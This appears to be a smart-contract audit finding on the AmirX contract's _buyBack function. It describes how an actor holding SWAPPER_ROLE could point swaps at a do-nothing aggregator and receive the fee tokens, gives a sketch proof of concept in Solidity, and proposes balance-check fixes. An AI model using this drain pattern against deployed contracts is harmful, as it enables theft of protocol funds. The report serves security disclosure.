# Incomplete error handling in _buyBack function

### Summary

In the AmirX codebase, the _buyBack function has an incomplete error handling 

### Root Cause

In AmirX.sol:buyBack()  there is inconsistent error handling between POL and ERC20 token paths:
// POL path has specific error messages
require(polSwap, "AmirX: POL swap transaction failed");
require(success, "AmirX: POL send transaction failed");

// ERC20 path only has one error message
require(ercSwap, "AmirX: token swap transaction failed");
// But no error handling for:
feeToken.forceApprove(aggregator, 0);
feeToken.safeIncreaseAllowance(aggregator, feeToken.balanceOf(address(this)));
feeToken.safeTransfer(safe, remainder);

This inconsistency means that:
1. ERC20 failures will be harder to diagnose as they lack specific error messages
2. The StablecoinHandler's error tracking will be incomplete for ERC20 operations
3. The mechanism can't properly report failures to upstream systems or users

### Internal pre-conditions

SWAPPER_ROLE needs to call swap(), defiToStablecoinSwap(), stablecoinToDefiSwap(), or defiSwap() with a DefiSwap struct where:
feeToken needs to be set to any ERC20 token other than TELCOIN
aggregator needs to be set to a non-zero address
swapData needs to be non-empty
defiSafe needs to be set to a non-zero address

The contract needs to have a non-zero balance of feeToken to trigger the buyback logic

For POL-specific issues:
feeToken needs to be set to POL address (0x0000000000000000000000000000000000001010)
msg.value needs to be non-zero to execute POL swap

For ERC20-specific issues:
feeToken needs to be any ERC20 token other than TELCOIN and POL
Contract needs to have approval to spend feeToken

### External pre-conditions

The external aggregator contract needs to:
Be active and non-paused (if it has pause functionality)
Accept the swapData parameter format
Return true for the low-level call to trigger the incomplete error handling path

For POL swaps:
Polygon network needs to be operational
Gas price needs to be sufficient to execute the POL swap transaction

For ERC20 swaps:
The external ERC20 token contract needs to:
Be active and non-paused (if it has pause functionality)
Have sufficient liquidity in the aggregator contract
Accept approve/transferFrom calls

For the forceApprove operation:
The ERC20 token needs to support either:
Standard approve function
Or both approve and increaseAllowance functions

### Attack Path

ttacker first deploys a malicious aggregator contract
This contract is designed to simply return true for any call but doesn't actually perform any token swaps
The malicious contract needs to maintain this minimal interface to pass basic checks

Attacker needs to obtain the SWAPPER_ROLE first
They then call one of the swap functions (like defiSwap) with carefully crafted parameters:
Sets their address as the defiSafe (where remaining tokens go)
Points to their malicious aggregator contract
Specifies any non-TELCOIN token as the feeToken
Includes any non-empty swapData

When _buyBack executes, it approves the malicious aggregator to spend the fee tokens
The function calls the malicious aggregator expecting a swap
The malicious aggregator returns true but doesn't perform any swap
Due to incomplete error handling, the function only checks if the call returned true
It doesn't verify if the swap actually occurred or check resulting balances

Since no swap occurred, all fee tokens remain in the contract
The function then sends all remaining tokens to the defiSafe address (attacker)
The attacker now has all the fee tokens, and no TELCOIN was bought back

### Impact

The protocol suffers a 100% loss of the fee tokens meant for buyback. The attacker gains these fee tokens directly.
Example calculation:
If there are 1000 USDC in fees
Protocol loses all 1000 USDC
Attacker gains 1000 USDC
No TELCOIN is bought back

The protocol suffers reduced TELCOIN buy pressure due to failed buybacks
TELCOIN holders suffer indirect value loss due to missing buy pressure

### PoC

// Attacker deploys malicious aggregator contract
contract MaliciousAggregator {
    function call(bytes memory data) external returns (bool) {
        // Return true but don't actually perform swap
        return true;
    }
}

// 1. Attacker (with SWAPPER_ROLE) calls defiSwap with:
DefiSwap memory defi = DefiSwap({
    defiSafe: attacker,
    aggregator: maliciousAggregatorAddress,  // Malicious aggregator
    plugin: ISimplePlugin(address(0)),
    feeToken: legitimateERC20Token,          // Any non-TELCOIN token
    referrer: address(0),
    referralFee: 0,
    walletData: "",
    swapData: "0x..."                        // Any non-empty data
});

// 2. _buyBack function is called internally:
feeToken.forceApprove(aggregator, 0);
feeToken.safeIncreaseAllowance(
    aggregator,
    feeToken.balanceOf(address(this))
);

// 3. Malicious aggregator call returns true but doesn't swap
(bool ercSwap, ) = aggregator.call{value: 0}(swapData);
require(ercSwap, "AmirX: token swap transaction failed");  // Passes!

// 4. Remaining balance is sent to defiSafe (attacker)
uint256 remainder = feeToken.balanceOf(address(this));
if (remainder > 0) feeToken.safeTransfer(safe, remainder);

If this code executes, the attacker is able to steal the tokens

### Mitigation

Track initial balances of both fee tokens and TELCOIN
Verify fee tokens were actually spent
Verify TELCOIN was actually received

Add specific requirements for successful swap execution
Verify token movements rather than just trusting return values

Add events to track buyback execution
Include relevant amounts for off-chain monitoring

Consider adding minimum output amounts for slippage protection
Add a maximum allowable balance change check
Consider implementing a more robust swap verification mechanism
Add timeouts for swap execution
Consider using a try-catch pattern for better error handling


Like this:
function _buyBack(
    ERC20 feeToken,
    address aggregator,
    address safe,
    bytes memory swapData
) internal {
    // Add initial balance checks
    uint256 initialFeeTokenBalance = feeToken.balanceOf(address(this));
    uint256 initialTelBalance = TELCOIN.balanceOf(address(this));
    
    if (address(feeToken) == address(0)) return;
    
    if (address(feeToken) == POL) {
        (bool polSwap, ) = aggregator.call{value: msg.value}(swapData);
        require(polSwap, "AmirX: POL swap transaction failed");
        
        // Verify POL swap resulted in TELCOIN acquisition
        require(
            TELCOIN.balanceOf(address(this)) > initialTelBalance,
            "AmirX: POL swap did not yield TELCOIN"
        );

        if (address(this).balance > 0) {
            (bool success, ) = safe.call{value: address(this).balance}("");
            require(success, "AmirX: POL send transaction failed");
        }
    } else {
        // ERC20 path
        feeToken.forceApprove(aggregator, 0);
        uint256 swapAmount = feeToken.balanceOf(address(this));
        feeToken.safeIncreaseAllowance(aggregator, swapAmount);

        (bool ercSwap, ) = aggregator.call{value: 0}(swapData);
        require(ercSwap, "AmirX: token swap transaction failed");
        
        // Verify the swap actually occurred
        require(
            feeToken.balanceOf(address(this)) < initialFeeTokenBalance,
            "AmirX: fee tokens not spent"
        );
        require(
            TELCOIN.balanceOf(address(this)) > initialTelBalance,
            "AmirX: swap did not yield TELCOIN"
        );

        // Transfer remaining fee tokens if any
        uint256 remainder = feeToken.balanceOf(address(this));
        if (remainder > 0) {
            feeToken.safeTransfer(safe, remainder);
        }
    }

    // Add event for tracking
    emit BuybackExecuted(
        address(feeToken),
        initialFeeTokenBalance,
        TELCOIN.balanceOf(address(this)) - initialTelBalance
    );
}

// Add event definition
event BuybackExecuted(
    address feeToken,
    uint256 feeTokensSpent,
    uint256 telcoinReceived
);
